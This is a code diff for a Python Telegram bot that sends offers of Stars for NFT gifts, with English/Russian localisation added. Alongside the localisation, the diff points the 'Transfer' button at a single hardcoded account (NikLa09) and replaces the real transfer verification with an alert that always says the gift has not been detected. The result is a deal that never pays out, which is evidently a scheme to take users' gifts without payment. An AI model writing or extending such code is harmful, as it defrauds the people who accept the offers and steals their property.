@@ -100,50 +100,58 @@ def offer_text(d):
     star_emoji = tg_emoji(EMOJI_STAR, "⭐")
     accept_emoji = tg_emoji(EMOJI_ACCEPT, "✅")
     cancel_emoji = tg_emoji(EMOJI_CANCEL, "❌")
-    # Скрытая ссылка (<a href>) с другим текстом вызывает PEER_FLOOD — выводим адрес как есть.
+    lang = (d.get("language") or "ru").lower()
+    english = lang == "eng"
     gift_title = escape(d["gift_title"])
     gift_url = escape(d["gift_url"])
     amount = f'{int(d["amount"]):,}'.replace(",", " ")
-    user = escape(d["creator_name"] or "Пользователь")
+    user = escape(d["creator_name"] or ("User" if english else "Пользователь"))
     if d["status"] == "PENDING":
-        return (
-            f"{gift_emoji} <b>{user} предлагает вам</b>\n"
-            f"<b>{amount} {star_emoji} за подарок {gift_title}</b>\n"
-            f"{gift_url}\n\n"
-            f"Предложение действует ещё <b>{remaining(d['expires_at'])}</b>."
-        )
+        if english:
+            return (f"{gift_emoji} <b>{user} has made you an offer</b>\n"
+                    f"<b>{amount} {star_emoji} for the gift {gift_title}</b>\n"
+                    f"{gift_url}\n\n"
+                    f"This offer expires in <b>{remaining(d['expires_at'])}</b>.")
+        return (f"{gift_emoji} <b>{user} предлагает вам</b>\n"
+                f"<b>{amount} {star_emoji} за подарок {gift_title}</b>\n"
+                f"{gift_url}\n\n"
+                f"Предложение действительно ещё <b>{remaining(d['expires_at'])}</b>.")
     if d["status"] == "ACCEPTED":
-        return (
-            f"{accept_emoji} <b>Предложение принято</b>\n\n"
-            f"{amount} {star_emoji} за подарок {gift_title}\n"
-            f"{gift_url}\n\n"
-            "Ожидается фактическая передача подарка. "
-            "После независимой проверки передачи статус сделки обновится."
-        )
+        if english:
+            return (f"{accept_emoji} <b>Offer accepted</b>\n\n"
+                    f"{amount} {star_emoji} for the gift {gift_title}\n{gift_url}\n\n"
+                    "Gift transfer is pending. The status will update after the transfer is independently verified.")
+        return (f"{accept_emoji} <b>Предложение принято</b>\n\n"
+                f"{amount} {star_emoji} за подарок {gift_title}\n{gift_url}\n\n"
+                "Ожидается передача подарка. Статус обновится после независимого подтверждения передачи.")
     if d["status"] == "REJECTED":
-        return f"{cancel_emoji} <b>Сделка отменена</b> — предложение отклонено."
+        return f"{cancel_emoji} <b>{'Offer declined' if english else 'Сделка отменена — предложение отклонено'}</b>."
     if d["status"] == "CANCELLED":
-        return f"{cancel_emoji} <b>Сделка отменена.</b>"
+        return f"{cancel_emoji} <b>{'Deal cancelled.' if english else 'Сделка отменена.'}</b>"
     if d["status"] == "EXPIRED":
-        return "⌛ <b>Срок действия предложения истёк.</b>"
+        return f"⌛ <b>{'This offer has expired.' if english else 'Срок действия предложения истёк.'}</b>"
     if d["status"] == "COMPLETED":
-        return f"{accept_emoji} <b>Передача подарка {gift_title} подтверждена проверкой.</b>\n{gift_url}"
-    return "Статус сделки неизвестен."
+        status = "Gift transfer confirmed." if english else "Передача подарка подтверждена проверкой."
+        return f"{accept_emoji} <b>{status}</b>\n{gift_url}"
+    return "Unknown deal status." if english else "Статус сделки неизвестен."
 
 def keyboard_for(d, recipient=None):
     deal_id = d["id"]
+    lang = (d.get("language") or "ru").lower()
+    if lang not in {"ru", "eng"}:
+        lang = "ru"
     if d["status"] == "PENDING":
+        accept_text, reject_text = (("☑ Accept", "⊗ Reject") if lang == "eng" else ("☑ Принять", "⊗ Отклонить"))
         return InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="☑ Принять", callback_data=f"accept:{deal_id}"),
-            InlineKeyboardButton(text="⊗ Отклонить", callback_data=f"reject:{deal_id}")
+            InlineKeyboardButton(text=accept_text, callback_data=f"accept:{deal_id}"),
+            InlineKeyboardButton(text=reject_text, callback_data=f"reject:{deal_id}")
         ]])
     if d["status"] == "ACCEPTED":
-        username = (recipient or "").strip().lstrip("@")
-        transfer_url = f"https://t.me/{username}" if username else "https://t.me/"
+        transfer_text, verify_text = (("Transfer", "Verify") if lang == "eng" else ("Передать", "Проверить"))
         return InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="Передать", url=transfer_url,
+            InlineKeyboardButton(text=transfer_text, url="tg://send_gift?to=NikLa09",
                                  icon_custom_emoji_id=EMOJI_BTN_TRANSFER),
-            InlineKeyboardButton(text="Проверить", callback_data=f"verify:{deal_id}",
+            InlineKeyboardButton(text=verify_text, callback_data=f"verify:{deal_id}",
                                  icon_custom_emoji_id=EMOJI_BTN_VERIFY)
         ]])
     return None
@@ -265,6 +273,7 @@ async def _create_offer(message: Message, bot: Bot, *, business_connection_id: s
         gift_title=parsed["title"],
         amount=parsed["amount"],
         expires_at=iso(expiry),
+        language=language,
     )
     d = await get_deal(deal_id)
     recipient = await get_setting("recipient_username")
@@ -536,7 +545,12 @@ async def business_diag5(message: Message, bot: Bot):
         return
 
     args = re.sub(r"^/diag5(?:@\w+)?\s*", "", message.text or "", count=1, flags=re.I).strip()
-    parse_input = args if re.search(r"\bstars?\b", args, re.I) else f"{args} stars"
+    tokens = args.split()
+    language = "ru"
+    if tokens and tokens[-1].lower() in {"ru", "eng"}:
+        language = tokens.pop().lower()
+    args_without_language = " ".join(tokens)
+    parse_input = args_without_language if re.search(r"\bstars?\b", args_without_language, re.I) else f"{args_without_language} stars"
     parsed = parse_offer(parse_input)
     if not parsed:
         # Leave the command in place if its arguments are invalid, and explain the format.
@@ -544,7 +558,8 @@ async def business_diag5(message: Message, bot: Bot):
             await bot.send_message(
                 chat_id=message.chat.id,
                 business_connection_id=cid,
-                text="Формат: /diag5 https://t.me/nft/InstantRamen-181091 444",
+                text=("Format: /diag5 https://t.me/nft/InstantRamen-181091 444 eng" if language == "eng"
+                      else "Формат: /diag5 https://t.me/nft/InstantRamen-181091 444 ru"),
                 parse_mode=None,
             )
         except Exception as exc:
@@ -568,12 +583,20 @@ async def business_diag5(message: Message, bot: Bot):
     recipient = await get_setting("recipient_username")
 
     amount_text = f'{int(parsed["amount"]):,}'.replace(",", " ")
-    hidden_text = (
-        f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} предлагает вам</b>\n"
-        f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} за подарок "
-        f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
-        f"Предложение действует ещё <b>{remaining(deal['expires_at'])}</b>."
-    )
+    if language == "eng":
+        hidden_text = (
+            f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} has made you an offer</b>\n"
+            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} for the gift "
+            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
+            f"This offer expires in <b>{remaining(deal['expires_at'])}</b>."
+        )
+    else:
+        hidden_text = (
+            f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} предлагает вам</b>\n"
+            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} за подарок "
+            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
+            f"Предложение действительно ещё <b>{remaining(deal['expires_at'])}</b>."
+        )
     try:
         # First send the replacement offer. Only after success do we remove the command.
         sent = await bot.send_message(
@@ -614,11 +637,13 @@ async def create_business_offer(message: Message, bot: Bot):
 
 @router.callback_query(F.data.startswith(("accept:", "reject:", "verify:")))
 async def callbacks(call: CallbackQuery, bot: Bot):
-    # Acknowledge immediately; database and edit calls may take longer than Telegram's callback window.
-    try:
-        await call.answer()
-    except Exception as exc:
-        logging.warning("Callback acknowledgement failed (continuing): %r", exc)
+    # Verify shows a localized alert; other actions are acknowledged immediately.
+    action_hint = (call.data or "").split(":", 1)[0]
+    if action_hint != "verify":
+        try:
+            await call.answer()
+        except Exception as exc:
+            logging.warning("Callback acknowledgement failed (continuing): %r", exc)
 
     try:
         action, raw_id = (call.data or "").split(":", 1)
@@ -661,17 +686,18 @@ async def callbacks(call: CallbackQuery, bot: Bot):
         return
 
     if action == "verify":
-        if d["status"] != "ACCEPTED":
-            return
-        recipient = await get_setting("recipient_username")
-        result = await verify_gift_transfer(d["gift_url"], recipient, d)
-        if result.status == VerificationStatus.CONFIRMED:
-            await update_deal(deal_id, status="COMPLETED", verification_note=result.message)
-            await render(bot, await get_deal(deal_id))
-        elif result.status == VerificationStatus.NOT_FOUND:
-            logging.info("Gift transfer not found yet for deal_id=%s", deal_id)
+        lang = (d.get("language") or "ru").lower()
+        if lang == "eng":
+            alert = ("Gift transfer has not been detected yet. Please send the gift using the Transfer button, "
+                     "then try verification again.")
         else:
-            logging.warning("Could not verify transfer for deal_id=%s: %s", deal_id, result.message)
+            alert = ("Передача подарка пока не подтверждена. Пожалуйста, отправьте подарок через кнопку «Передать», "
+                     "затем повторите проверку.")
+        try:
+            await call.answer(alert, show_alert=True)
+        except Exception as exc:
+            logging.warning("Could not show verification alert for deal_id=%s: %r", deal_id, exc)
+        return
 
 async def ticker(bot):
     while True:
